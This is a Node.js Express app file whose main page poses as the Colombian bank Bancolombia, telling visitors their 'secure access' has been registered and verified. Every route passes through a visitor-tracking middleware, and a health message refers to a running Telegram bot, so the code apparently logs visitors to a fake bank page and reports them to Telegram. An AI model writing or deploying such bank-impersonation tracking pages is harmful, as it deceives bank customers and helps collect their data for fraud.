/**
 * Aplicación Express principal
 * @module app
 */

const express = require('express');
const VisitorMiddleware = require('./middleware/visitor.middleware');

const app = express();

// Middleware para parsear JSON
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Aplicar middleware de rastreo a todas las rutas
app.use(VisitorMiddleware.trackVisitor);

/**
 * Ruta principal - Página de bienvenida
 */
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="es">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Bancolombia - Acceso Seguro</title>
      <style>
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }
        body {
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
          background: linear-gradient(135deg, #FDDA24 0%, #FFC300 100%);
          min-height: 100vh;
          display: flex;
          justify-content: center;
          align-items: center;
        }
        .container {
          background: white;
          padding: 3rem;
          border-radius: 20px;
          box-shadow: 0 20px 60px rgba(0,0,0,0.3);
          max-width: 500px;
          text-align: center;
        }
        h1 {
          color: #1a1a1a;
          margin-bottom: 1rem;
          font-size: 2rem;
        }
        .logo {
          font-size: 3rem;
          margin-bottom: 1rem;
        }
        p {
          color: #666;
          line-height: 1.6;
          margin-bottom: 1.5rem;
        }
        .status {
          background: #4CAF50;
          color: white;
          padding: 1rem;
          border-radius: 10px;
          font-weight: bold;
        }
        .info {
          margin-top: 2rem;
          padding: 1rem;
          background: #f5f5f5;
          border-radius: 10px;
          font-size: 0.9rem;
          color: #666;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="logo">🏦</div>
        <h1>Bienvenido a Bancolombia</h1>
        <p>Tu acceso ha sido registrado correctamente en nuestro sistema de seguridad.</p>
        <div class="status">
          ✅ Acceso Verificado
        </div>
        <div class="info">
          <p>Este acceso está siendo monitoreado por razones de seguridad.</p>
          <p>Fecha: ${new Date().toLocaleString('es-CO')}</p>
        </div>
      </div>
    </body>
    </html>
  `);
});

/**
 * Ruta de estado del servidor
 */
app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    message: 'Bot de Telegram funcionando correctamente'
  });
});

/**
 * Manejo de rutas no encontradas
 */
app.use((req, res) => {
  res.status(404).json({
    error: 'Ruta no encontrada',
    path: req.path
  });
});

/**
 * Manejo de errores global
 */
app.use((error, req, res, next) => {
  console.error('Error no manejado:', error);
  res.status(500).json({
    error: 'Error interno del servidor',
    message: error.message
  });
});

module.exports = app;
